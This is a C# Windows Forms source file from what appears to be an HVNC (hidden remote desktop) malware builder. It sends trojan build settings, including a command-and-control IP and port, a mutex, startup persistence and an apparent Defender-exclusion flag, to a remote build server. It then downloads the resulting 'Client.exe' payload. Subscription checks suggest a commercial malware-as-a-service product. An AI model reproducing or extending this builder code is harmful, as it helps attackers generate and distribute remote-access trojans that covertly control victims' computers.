using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using HVNC.Utils;
using HVNC.WebBuilder;

namespace HVNC
{
	public class FrmBuilderStatus : Form
	{
		private Guna2ControlBox CloseBtn;

		private IContainer components;

		private RichTextBox ConsoleBox;

		private Guna2BorderlessForm guna2BorderlessForm1;

		private Guna2DragControl guna2DragControl1;

		private Guna2GroupBox guna2GroupBox1;

		private Guna2ShadowForm guna2ShadowForm1;

		public FrmBuilderStatus()
		{
			InitializeComponent();
		}

		private void CloseBtn_Click(object sender, EventArgs e)
		{
			Close();
		}

		public async void buildmodafaka()
		{
			FrmBuilderStatus frmBuilderStatus = this;
			Stopwatch buildtime = new Stopwatch();
			buildtime.Start();
			await Task.Delay(2000);
			frmBuilderStatus.ConsoleBox.Text += "Connecting To Building Server!";
			await Task.Delay(1000);
			if (HVNC.WebBuilder.WebBuilder.IsBuilderAlive() != "alive")
			{
				frmBuilderStatus.ConsoleBox.Text += "\nBuilding Server Is Unreachable!";
				return;
			}
			await Task.Delay(1000);
			frmBuilderStatus.ConsoleBox.Text += "\nConnected To Building Server!";
			await Task.Delay(1000);
			frmBuilderStatus.ConsoleBox.Text += "\nBuilding File...";
			await Task.Delay(1000);
			string ServerResponse = HVNC.WebBuilder.WebBuilder.SendBuild(BuildInfo.ip, BuildInfo.port, BuildInfo.id, BuildInfo.mutex, BuildInfo.startup, BuildInfo.path, BuildInfo.folder, BuildInfo.filename, BuildInfo.wdex, BuildInfo.hhvnc);
			await Task.Delay(3500);
			switch (ServerResponse)
			{
			case "success":
			{
				frmBuilderStatus.ConsoleBox.Text += "\nClient Built!";
				await Task.Delay(1000);
				using (WebClient client = new WebClient())
				{
					if (File.Exists(Directory.GetCurrentDirectory() + "\\Client.exe"))
					{
						File.Delete(Directory.GetCurrentDirectory() + "\\Client.exe");
					}
					client.DownloadFile(HVNC.WebBuilder.WebBuilder.DownloadURL + HVNC.WebBuilder.WebBuilder.Username + "/Client.exe", Directory.GetCurrentDirectory() + "\\Client.exe");
					frmBuilderStatus.ConsoleBox.Text += "\nCleaning Build...";
					HVNC.WebBuilder.WebBuilder.DeleteOldBuild();
					await Task.Delay(1000);
					frmBuilderStatus.ConsoleBox.Text += "\nReceiving Client...";
					await Task.Delay(1000);
				}
				frmBuilderStatus.ConsoleBox.Text += "\nReceived Client!";
				await Task.Delay(1000);
				buildtime.Stop();
				RichTextBox consoleBox = frmBuilderStatus.ConsoleBox;
				consoleBox.Text = consoleBox.Text + "\nBuild Successfully... \nTime Elapsed: " + TimeSpan.FromMilliseconds(buildtime.ElapsedMilliseconds).Seconds + " Seconds";
				await Task.Delay(2000);
				Process.Start("explorer", Directory.GetCurrentDirectory());
				HVNC.Utils.Utils.xTLOG("Build Success");
				Stopwatch stopwatch = new Stopwatch();
				stopwatch.Start();
				while (stopwatch.IsRunning)
				{
					if (stopwatch.ElapsedMilliseconds > 4000)
					{
						stopwatch.Stop();
						break;
					}
				}
				frmBuilderStatus.Close();
				break;
			}
			case "invalid-arguments":
				frmBuilderStatus.ConsoleBox.Text += "\nBuilding Server Encountered An Error!\nError Code: INVARGS";
				await Task.Delay(1000);
				HVNC.Utils.Utils.xTLOG("Error Code: INVARGS");
				break;
			case "missing-args":
				frmBuilderStatus.ConsoleBox.Text += "\nBuilding Server Encountered An Error!\nError Code: MISSARGS";
				HVNC.Utils.Utils.xTLOG("Error Code: MISSARGS");
				await Task.Delay(1000);
				break;
			case "invalid-user-or-expired":
				frmBuilderStatus.ConsoleBox.Text += "\nSubscription Expired!";
				HVNC.Utils.Utils.xTLOG("Possible Bypass Detected: Expired User Tried to Build");
				Environment.Exit(Environment.ExitCode);
				break;
			}
		}

		private void FrmBuilderStatus_Shown(object sender, EventArgs e)
		{
			buildmodafaka();
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		private void InitializeComponent()
		{
			components = new System.ComponentModel.Container();
			System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(HVNC.FrmBuilderStatus));
			guna2GroupBox1 = new Guna.UI2.WinForms.Guna2GroupBox();
			CloseBtn = new Guna.UI2.WinForms.Guna2ControlBox();
			ConsoleBox = new System.Windows.Forms.RichTextBox();
			guna2DragControl1 = new Guna.UI2.WinForms.Guna2DragControl(components);
			guna2ShadowForm1 = new Guna.UI2.WinForms.Guna2ShadowForm(components);
			guna2BorderlessForm1 = new Guna.UI2.WinForms.Guna2BorderlessForm(components);
			guna2GroupBox1.SuspendLayout();
			SuspendLayout();
			guna2GroupBox1.BorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2GroupBox1.BorderThickness = 10;
			guna2GroupBox1.Controls.Add(CloseBtn);
			guna2GroupBox1.Controls.Add(ConsoleBox);
			guna2GroupBox1.CustomBorderColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2GroupBox1.Dock = System.Windows.Forms.DockStyle.Fill;
			guna2GroupBox1.FillColor = System.Drawing.Color.Transparent;
			guna2GroupBox1.Font = new System.Drawing.Font("Electrolize", 9f);
			guna2GroupBox1.ForeColor = System.Drawing.Color.Gainsboro;
			guna2GroupBox1.Location = new System.Drawing.Point(0, 0);
			guna2GroupBox1.Name = "guna2GroupBox1";
			guna2GroupBox1.ShadowDecoration.Parent = guna2GroupBox1;
			guna2GroupBox1.Size = new System.Drawing.Size(575, 318);
			guna2GroupBox1.TabIndex = 1;
			guna2GroupBox1.Text = "Build server status";
			CloseBtn.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
			CloseBtn.BackColor = System.Drawing.Color.Transparent;
			CloseBtn.FillColor = System.Drawing.Color.Transparent;
			CloseBtn.HoverState.Parent = CloseBtn;
			CloseBtn.IconColor = System.Drawing.Color.White;
			CloseBtn.Location = new System.Drawing.Point(518, 2);
			CloseBtn.Name = "CloseBtn";
			CloseBtn.ShadowDecoration.Parent = CloseBtn;
			CloseBtn.Size = new System.Drawing.Size(45, 35);
			CloseBtn.TabIndex = 140;
			CloseBtn.Click += new System.EventHandler(CloseBtn_Click);
			ConsoleBox.BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			ConsoleBox.BorderStyle = System.Windows.Forms.BorderStyle.None;
			ConsoleBox.Font = new System.Drawing.Font("Electrolize", 9.75f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
			ConsoleBox.ForeColor = System.Drawing.Color.Gainsboro;
			ConsoleBox.Location = new System.Drawing.Point(10, 41);
			ConsoleBox.Name = "ConsoleBox";
			ConsoleBox.Size = new System.Drawing.Size(555, 267);
			ConsoleBox.TabIndex = 1;
			ConsoleBox.Text = "";
			guna2DragControl1.TargetControl = guna2GroupBox1;
			guna2ShadowForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2ShadowForm1.TargetForm = this;
			guna2BorderlessForm1.ContainerControl = this;
			guna2BorderlessForm1.DockIndicatorTransparencyValue = 0.6;
			guna2BorderlessForm1.ShadowColor = System.Drawing.Color.FromArgb(191, 38, 33);
			guna2BorderlessForm1.TransparentWhileDrag = true;
			base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			BackColor = System.Drawing.Color.FromArgb(22, 22, 22);
			base.ClientSize = new System.Drawing.Size(575, 318);
			base.Controls.Add(guna2GroupBox1);
			DoubleBuffered = true;
			ForeColor = System.Drawing.Color.White;
			base.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
			base.Name = "FrmBuilderStatus";
			base.ShowInTaskbar = false;
			Text = "FrmBuilderStatus";
			base.TopMost = true;
			base.Shown += new System.EventHandler(FrmBuilderStatus_Shown);
			guna2GroupBox1.ResumeLayout(false);
			ResumeLayout(false);
		}
	}
}
